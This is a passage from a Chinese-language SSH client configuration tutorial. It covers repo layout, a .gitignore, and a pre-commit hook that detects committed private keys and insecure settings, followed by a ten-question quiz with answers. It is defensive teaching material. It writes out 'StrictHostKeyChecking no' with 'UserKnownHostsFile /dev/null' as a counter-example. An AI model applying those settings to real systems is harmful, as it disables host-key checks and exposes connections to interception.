> | 檔案 | 內容 | 進 repo？ | 理由 |
> | --- | --- | --- | --- |
> | `10-bastion.conf` | 兩台跳板機 | ✅ 私有 repo | ★★★★ 含外網 IP + 非標準 port，**絕不能公開** |
> | `20-prod.conf` | db01 等正式機 | ✅ 私有 repo | ★★★ 這是資產清冊，異動要 review |
> | `80-local.conf` | 個人金鑰路徑、個人偏好 | ❌ | ★★★ 每個人不一樣，且透露命名規則 |
> | `90-defaults.conf` | `Host *` 共用 | ✅ 私有 repo | ★★★★ **檔名前綴必須最大** |
>
> ```bash
> cat > ~/repos/ssh-config/.gitignore <<'EOF'
> # ★★★★★ 私鑰與任何憑證，一行都不能進
> id_*
> !id_*.pub
> *.pem
> *.key
>
> # ★★★★ 個人設定
> config.d/80-local.conf
> config.d/*.local.conf
>
> # ★★★ 主機指紋（含連過哪些機器的紀錄，本身是情報）
> known_hosts*
>
> # ★★ 備份與暫存
> *.bak
> *.bak.*
> *~
> EOF
> ```
>
> **pre-commit 檢查（★★★★ 這是真正的防線，.gitignore 只防手滑）：**
> ```bash
> cat > ~/repos/ssh-config/.git/hooks/pre-commit <<'EOF'
> #!/usr/bin/env bash
> set -euo pipefail
> FAIL=0
> # ★★★★★ 私鑰
> if git diff --cached -U0 | grep -qE 'BEGIN (OPENSSH|RSA|EC|DSA) PRIVATE KEY'; then
>     echo "★★★★★ 偵測到私鑰內容，拒絕 commit" >&2; FAIL=1
> fi
> # ★★★★ 危險設定
> if git diff --cached -U0 | grep -qiE '^\+.*(StrictHostKeyChecking[[:space:]]+no|UserKnownHostsFile[[:space:]]+/dev/null|ForwardAgent[[:space:]]+yes)'; then
>     echo "★★★★ 偵測到高風險 SSH 設定，拒絕 commit" >&2; FAIL=1
> fi
> # ★★★★ 可執行本機指令的指示詞，需人工確認
> if git diff --cached -U0 | grep -qiE '^\+.*(Match exec|LocalCommand|PermitLocalCommand)'; then
>     echo "★★★★ 偵測到 Match exec / LocalCommand，請人工檢視後用 --no-verify" >&2; FAIL=1
> fi
> # ★★★★ Host * 必須在字典序最後一個檔案
> last=$(ls ~/repos/ssh-config/config.d/*.conf | tail -1)
> if grep -rl '^Host \*' ~/repos/ssh-config/config.d/*.conf | grep -qv "$last"; then
>     echo "★★★★★ Host * 出現在非最後一個檔案 —— 會鎖死所有主機設定" >&2; FAIL=1
> fi
> exit $FAIL
> EOF
> chmod +x ~/repos/ssh-config/.git/hooks/pre-commit
> ```
>
> 測試：
> ```bash
> echo "StrictHostKeyChecking no" >> ~/repos/ssh-config/config.d/90-defaults.conf
> git -C ~/repos/ssh-config add -A && git -C ~/repos/ssh-config commit -m test
> ```
> ```text
> ★★★★ 偵測到高風險 SSH 設定，拒絕 commit
> ```

---

## 小測驗

Q1. 一份 config 裡 `Host *` 寫了 `User root`，下面的 `Host web01` 寫了 `User deploy`。
`ssh web01` 會用哪個帳號？**為什麼**？而 `Host web01` 裡的 `Port 2222` 會不會生效？

Q2. 你改了 `~/.ssh/config` 的 `User`，`ssh -G web01` 顯示的是**新值**，
但實際 `ssh web01` 進去 `whoami` 還是**舊帳號**。發生什麼事？**第一個該下的指令**是什麼？

Q3. `ssh -G nosuchhost` 的輸出裡 `hostname nosuchhost`。這代表什麼？該往哪裡查？

Q4. 下面兩行差在哪？哪一個是對的？
```text
ProxyCommand ssh -W %h:%p bastion
ProxyCommand ssh -W %n:%p bastion
```

Q5. **是非題**：使用 `ProxyJump` 時，必須把私鑰複製一份到跳板機上，
否則跳板機無法幫你認證到目標主機。請說明理由。

Q6. `ControlPath` 為什麼建議用 `%C` 而不是 `%r@%h:%p`？
會出現什麼**確切的錯誤訊息**？

Q7. 機關的防火牆會清掉閒置 5 分鐘的連線。
`ServerAliveInterval`、`ClientAliveInterval`、`TCPKeepAlive` 三個裡面**該調哪一個**？
另外兩個為什麼不適合？

Q8. **選擇題**：以下哪一組是自動化腳本連新機器的正確設定？
（A）`StrictHostKeyChecking no` + `UserKnownHostsFile /dev/null`
（B）`StrictHostKeyChecking accept-new`
（C）`StrictHostKeyChecking yes`
（D）不設，用預設值
請說明 A 為什麼危險、B 為什麼比 A 安全。

Q9. `Host 10.10.*` 這個區塊，對 `Host web01 / HostName 10.10.20.11` 會不會生效？
為什麼？要怎麼寫才會生效？

Q10. `ssh` 突然回 `Too many authentication failures`，
但你**百分之百確定**金鑰是對的。原因是什麼？一行設定怎麼修？

> [!question]- 測驗答案
> **Q1.** **會用 `root`。★★★★★**
> `ssh_config` 的規則是「**第一個取得的值勝出**」（`man 5 ssh_config`：
> *the first obtained value for each parameter will be used*），
> 不是後面蓋前面。`Host *` 排在前面，它的 `User root` 一被讀到就把 `User` 這個參數
> **鎖死**，後面 `Host web01` 的 `User deploy` 完全被忽略。
> **但 `Port 2222` 會生效** —— 因為 `Host *` 區塊裡**沒有**設定 `Port`，
> 這個參數的「第一個值」就來自 `Host web01`。
> ★★★★ 這種「有些生效有些不生效」正是最難自己想通的地方，
> 很多人因此以為 config 壞了。驗證方式：
> ```bash
> ssh -G web01 | grep -E '^(user|port) '
> ```
> ```text
> user root
> port 2222
> ```
> **修法**：把 `Host *` 移到檔案**最後**。詳見〈觀念說明〉的「第一個匹配值勝出」。
>
> **Q2.** **★★★★ ControlPersist 留下的舊 master socket 還活著。**
> `ssh -G` 讀的是**設定檔**，反映的是「如果現在建新連線會用什麼參數」；
> 但你的 `ssh web01` **根本沒有建立新連線** —— 它接上了背景那個
> 用**舊參數**建立好的 master。`User`、`Port`、`IdentityFile`、`ProxyJump`
> 這些**建線期**參數，在複用連線上完全無效。
> **第一個該下的指令**：
> ```bash
> ssh -O exit web01
> ```
> ```text
> Exit request sent.
> ```
> 確認清乾淨：`ls -l ~/.ssh/cm/` 應該沒有對應的 socket。
> ★★★ 把「改完 config 先 `ssh -O exit`」變成反射動作，
> 可以省下大量無謂的除錯。詳見〈ControlMaster〉的「最大的陷阱」。
>
> **Q3.** **★★★★ 代表沒有任何 `Host` 或 `Match` 區塊匹配到這個別名。**
> 當沒有區塊設定 `HostName` 時，ssh 就直接把你在命令列打的字串當成主機名去解析。
> 所以「`hostname` 欄位等於你打的別名」是一個很好用的**判斷法則**：
> 只要它們一樣（而你本來期望是某個 IP），就是匹配失敗。
> **往這三個方向查**：
> ① **★★★ 別名拼字或大小寫**（`Host` 樣式比對是**分大小寫**的，`Web01` ≠ `web01`）；
> ② **★★★ 該檔案沒被 `Include` 進來**（副檔名不是 `.conf`？glob 沒對上？）；
> ③ **★★ 行尾有多餘空白**或用了全形字元。
> 確認指令：
> ```bash
> ssh -vvv -o ConnectTimeout=1 nosuchhost true 2>&1 | grep 'Applying options'
> ```
> 完全沒有 `Applying options for nosuchhost` 就證實了。見〈排查步驟【1】【2】〉。
>
> **Q4.** **★★★★ `%h` 是對的。**
> `%h` 展開成 **`HostName`**（解析後的實際位址，例如 `10.10.20.11`）；
> `%n` 展開成 **originalhost**（你在命令列打的別名，例如 `web01`）。
> `ProxyCommand` 是**在跳板機上執行**的 —— `ssh -W <目標>:<port>` 的目標
> 必須是**跳板機解析得出來的位址**。
> 用 `%n` 的話，跳板機收到的是 `web01` 這個字串，
> 除非跳板機的 `/etc/hosts` 或內部 DNS 剛好認得它，否則會失敗：
> ```text
> ssh: Could not resolve hostname web01: Name or service not known
> ```
> ★★★ 所以規則是：**`ProxyCommand` / `ProxyJump` 裡一律用 `%h`**。
> `%n` 的用途是寫 log 或 `LocalCommand` 時想顯示「使用者輸入的別名」。
> 見〈Token 替換一覽〉。
>
> **Q5.** **★★★★★ 錯（非）。跳板機上不需要、也絕不應該有你的私鑰。**
> `ProxyJump` 建立的是**兩層套疊的加密通道**：
> 外層是「你 ↔ 跳板機」的 SSH 連線；內層是「你 ↔ 目標主機」的 SSH 連線，
> 內層的封包被當成**純資料**塞進外層。
> 跳板機上實際執行的是 `ssh -W <目標>:<port>`（可用 `ssh -vvv | grep 'Executing proxy command'` 驗證），
> 它只做 **TCP 位元組轉發**，**解不開內層加密**，也**不參與目標主機的認證**。
> 目標主機的挑戰是由**你的筆電**上的私鑰（或 agent）簽章回應的。
> ★★★★★ 這正是 `ProxyJump` 相較「登入跳板機再手動 ssh」的最大安全價值：
> 跳板機是全公司最常被攻擊的機器，把私鑰放上去等於「一台淪陷＝全內網淪陷」。
> **驗收指令**：`ssh bastion 'ls ~/.ssh/id_* | wc -l'` 應該回 `0`。
> 見〈為什麼跳板機上不需要放你的私鑰〉的 ASCII 圖。
>
> **Q6.** **★★★ 因為 UNIX domain socket 的路徑有 108 bytes 硬性上限。**
> `%r@%h:%p` 展開後長度不固定 —— 家目錄深、FQDN 長、使用者名長，
> 很容易就爆掉，而且**只在特定主機上爆**，非常難重現。
> **確切錯誤訊息**：
> ```text
> ControlPath too long ('/home/opsadmin/.ssh/controlmasters/deploy@very.long.fqdn...' >= 108 bytes)
> ```
> `%C` 是 `%l`（本機 FQDN）`%h`（遠端主機）`%p`（port）`%r`（遠端使用者）
> `%j`（跳板）這幾項的**雜湊**，展開後**永遠是固定的 40 個十六進位字元**：
> ```bash
> ssh -G web01 | grep '^controlpath'
> ```
> ```text
> controlpath /home/opsadmin/.ssh/cm/870b88d70468db1aec77e680e51f07854ae36564
> ```
> ★★ `%C` 從 OpenSSH 6.7（2014）就有，相容性沒有問題。
> ★★★ 另一個好處是 socket 檔名看不出你連了哪台機器。見〈為什麼 ControlPath 一定要用 `%C`〉。
>
> **Q7.** **★★★★ 該調客戶端的 `ServerAliveInterval`（配 `ServerAliveCountMax`）。**
> ```text
> Host *
>     ServerAliveInterval 30
>     ServerAliveCountMax 3
> ```
> **三個理由**：
> ① 它是**你能控制的** —— 不用去求伺服器管理員改 `sshd_config`；
> ② 它送的是 **SSH 協定層的加密封包**，NAT 與狀態防火牆看到有實際流量，
> 會重置閒置計時器（30 秒 ≪ 5 分鐘，很安全）；
> ③ 沒回應時客戶端會**明確報錯**而不是傻等。
> **另外兩個為什麼不行**：
> · **`ClientAliveInterval`** ★★ 是寫在**伺服器端** `sshd_config` 的，
> 由 sshd 來數，主要目的是**清掉殭屍工作階段**，你改不到，
> 而且它的設計意圖跟「幫客戶端維持連線」不同（建議值見 [[04-sshd-伺服器端設定]]）；
> · **`TCPKeepAlive`** ★★★ 是作業系統 TCP 層的，Linux 預設 **7200 秒（2 小時）**
> 才送第一個探測，對「閒置 5 分鐘」完全來不及，而且它不加密。
> ★★★ 真正長時間的作業請用 [[01-tmux-工作階段管理]]，不要靠 keepalive 硬撐。
> 見〈連線穩定性三兄弟〉。
>
> **Q8.** **★★★★ 答案是（B）`StrictHostKeyChecking accept-new`。**
> **A 為什麼危險**：`no` 的意思不只是「沒看過的自動接受」，
> 更致命的是**「已經記錄過、但金鑰改變了的主機，也照樣接受」**——
> 而「已知主機的金鑰突然變了」正是**中間人攻擊的唯一訊號**。
> 再加上 `UserKnownHostsFile /dev/null`，驗證結果直接丟棄，
> ★★★★★ 你不但當下被騙，**事後連稽核軌跡都沒有**，
> 對機關而言這是「無法追溯」的重大缺失。
> **B 為什麼安全得多**：`accept-new` 只自動接受**從未見過**的主機，
> 對**金鑰已變更**的主機**仍然拒絕連線並跳出巨大警告**（與預設的 `ask` 相同），
> 同時把指紋**寫進 `known_hosts`** 留下紀錄。
> C（`yes`）在「事先佈署好 known_hosts」的高安控環境才可行，
> 否則新機器一律連不上；D（預設 `ask`）會互動詢問，腳本會卡住。
> ★★★ 想連第一次連線的風險都消除，就用 SSH 憑證（`@cert-authority`），
> 見 [[07-SSH-安全強化]]。詳見〈反面教材〉。
>
> **Q9.** **★★★★ 不會生效。**
> `Host` 比對的是 **originalhost** —— **你在命令列輸入的那個字串**。
> 你打 `ssh web01`，比對對象就是 `web01`，跟它最後解析成 `10.10.20.11` **完全無關**。
> `man 5 ssh_config` 寫得很明白：*The host is usually the hostname argument
> given on the command line*。
> **正確寫法是改用 `Match host`**：
> ```text
> Host web01
>     HostName 10.10.20.11
>
> Match host 10.10.* !host 10.10.99.*
>     IdentityFile ~/.ssh/id_ed25519_prod
>     IdentitiesOnly yes
> ```
> ★★★ **而且順序有第二個要求**：`Match host` 必須排在
> 「設定了 `HostName` 的那個 `Host` 區塊」**之後**，
> 否則解析到 `Match` 時 `%h` 還是 `web01`，一樣比不到。
> 驗證：
> ```bash
> ssh -G web01 | grep -E '^(hostname|identityfile ~)'
> ```
> ```text
> hostname 10.10.20.11
> identityfile ~/.ssh/id_ed25519_prod     # ★★★ 命中了
> ```
> 見〈Host 比對的是「你打的字」〉與〈Host 與 Match 的分工〉。
>
> **Q10.** **★★★★ 你的 ssh-agent 裡金鑰太多，撞到伺服器的 `MaxAuthTries`（預設 6）。**
> 沒有 `IdentitiesOnly yes` 時，ssh 會把 **agent 裡每一把金鑰**加上
> **五個預設路徑**（`id_rsa`、`id_ecdsa`、`id_ecdsa_sk`、`id_ed25519`、`id_ed25519_sk`）
> **一把一把送出去試**。試到第 6 把伺服器就直接踢掉連線 ——
> ★★★★ **即使正確的那把排在第 7 位**。這就是「金鑰明明是對的卻連不上」的成因。
> **一行修法**（寫在該 Host 區塊，不要寫在 `Host *` 以免遺漏個別需求）：
> ```text
> Host web01
>     IdentityFile ~/.ssh/id_ed25519_prod
>     IdentitiesOnly yes
> ```
> **驗證**：
> ```bash
> ssh -vv web01 2>&1 | grep -c 'Offering public key'
> ```
> ```text
> 1                          # ★★★★ 只送一把
> ```
> ★★★ 附帶的資安好處：不加這行時，你等於把**所有金鑰的公鑰指紋**
> 送給了對方伺服器，讓對方知道你還有哪些身分。
> 臨時解法是 `ssh-add -D` 清空 agent，但那治標不治本。見〈`IdentitiesOnly yes` 是必設項〉。

---

## 延伸閱讀

- [[02-SSH-金鑰認證與ssh-agent]] —— 本篇的 `IdentityFile` / `AddKeysToAgent` / `ForwardAgent` 都建立在金鑰與 agent 的機制上，`Too many authentication failures` 的根源也在那裡
- [[04-sshd-伺服器端設定]] —— 伺服器端的對應設定：`MaxAuthTries`、`ClientAliveInterval`、`AllowUsers`、`AcceptEnv`；`sshd -t` 語法檢查是伺服器端不能省的保命步驟
- [[05-SSH-隧道與埠轉發]] —— `LocalForward` / `RemoteForward` / `DynamicForward` 的完整語法與情境，本篇只示範「可以寫進 config」
- [[01-SSH-原理與第一次連線]] —— `StrictHostKeyChecking` 與 `known_hosts` 的原理；看懂本篇為什麼把 `no` 列為禁止
- [[07-SSH-安全強化]] —— SSH 憑證（CA 簽發、自動過期）可以一次解決 TOFU 與金鑰回收兩個問題，是 config 之上的下一步
- [[04-遠端編輯與VSCode-Remote]] —— VS Code Remote-SSH 讀的就是本篇這份 `~/.ssh/config`，安裝與埠轉發細節在那篇
- [[01-tmux-工作階段管理]] —— 長時間作業請放進 tmux，不要靠 `ServerAliveInterval` 硬撐
- [[02-rsync-同步與備份]] 與 [[01-scp與sftp傳輸]] —— 這兩個工具都走 ssh，會自動吃到本篇的別名與 ControlMaster 複用
- [[20-環境變數與設定檔]] —— `SetEnv` 與 shell 設定檔的關係
- OpenSSH `ssh_config(5)` 官方手冊：<https://man.openbsd.org/ssh_config>
- OpenSSH `ssh(1)` 官方手冊（`-G` / `-J` / `-O` / `-F`）：<https://man.openbsd.org/ssh>
- OpenSSH 版本發行說明（查某個設定項從哪一版開始有）：<https://www.openssh.com/releasenotes.html>
